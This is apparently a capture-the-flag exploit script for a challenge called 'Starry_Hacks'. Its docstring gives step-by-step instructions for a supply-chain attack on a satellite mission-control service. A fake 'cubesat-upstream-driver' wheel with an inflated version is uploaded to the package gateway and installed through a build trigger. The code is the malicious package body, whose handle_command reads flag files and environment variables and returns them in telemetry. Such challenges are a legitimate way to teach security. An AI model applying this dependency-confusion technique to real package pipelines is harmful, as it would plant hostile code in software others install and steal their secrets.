#!/usr/bin/env python3
"""Starry_Hacks — Supply chain attack on cubesat-upstream-driver.

The mission control service accepts wheel uploads to /api/upload, stores them
in an internal package gateway, and TRIGGER_BUILD runs pip install from that
gateway. The flight software on the satellite imports `handle_command` from
`cubesat-upstream-driver` and echoes its return value as `TM|EVENT|COMMAND_ACK`.

Exploit:
1. Build a malicious wheel `cubesat-upstream-driver==999.0.0` (version >
   the `>=1.0.0` requirement) with a `handle_command` that reads flag files.
2. POST to /api/upload (gateway accepts despite static score "marker not matched").
3. Send TRIGGER_BUILD via WebSocket — this restarts the mission control,
   installs our wheel on the satellite.
4. Send HELP (or any command) — handle_command runs on the satellite,
   returns flag in COMMAND_ACK telemetry.
"""
import glob
import os

CANDIDATES = [
    "/flag", "/flag.txt", "/app/flag", "/app/flag.txt", "/root/flag.txt",
    "/home/app/flag.txt", "/home/ctf/flag.txt", "/srv/flag.txt",
    "/opt/flag.txt", "/tmp/flag.txt", "/flag/flag.txt",
]

def _try_read():
    out = []
    for p in CANDIDATES:
        try:
            with open(p) as f:
                out.append(f.read().strip())
        except Exception:
            pass
    for env in ("FLAG", "FLAG_FILE", "CTF_FLAG"):
        if env in os.environ:
            out.append(os.environ[env])
    return out

def handle_command(cmd: str) -> str:
    found = _try_read()
    if found:
        return "FLAG|" + "|".join(found)
    return "FLAG|NOT_FOUND"